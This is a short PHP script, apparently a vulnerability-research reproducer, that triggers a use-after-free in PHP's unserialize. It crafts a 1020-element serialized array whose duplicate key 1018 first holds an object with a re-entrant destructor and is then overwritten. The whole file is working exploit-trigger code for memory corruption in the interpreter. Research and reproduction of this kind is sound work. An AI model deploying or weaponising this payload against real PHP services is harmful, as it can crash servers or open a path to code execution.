<?php
// vd1b: success-path variant of vd1 (correct element count, decode SUCCEEDS,
// no error-path tree free involved) -> proves the UAF needs only the
// duplicate-key ownership transfer into a var_dtor slot.
class D { public function __destruct() { unserialize('i:7;'); } }

$els = [];
for ($k = 0; $k <= 1017; $k++) { $els[] = "i:$k;i:1;"; }
$els[] = 'i:1018;O:1:"D":0:{}';
$els[] = 'i:1018;i:5;';
$payload = 'a:1020:{' . implode('', $els) . '}';   // 1020 elements = exact
echo "payload_len=" . strlen($payload) . "\n";
$r = unserialize($payload);
echo "unserialize returned ";
var_dump($r !== false);
echo "SURVIVED\n";
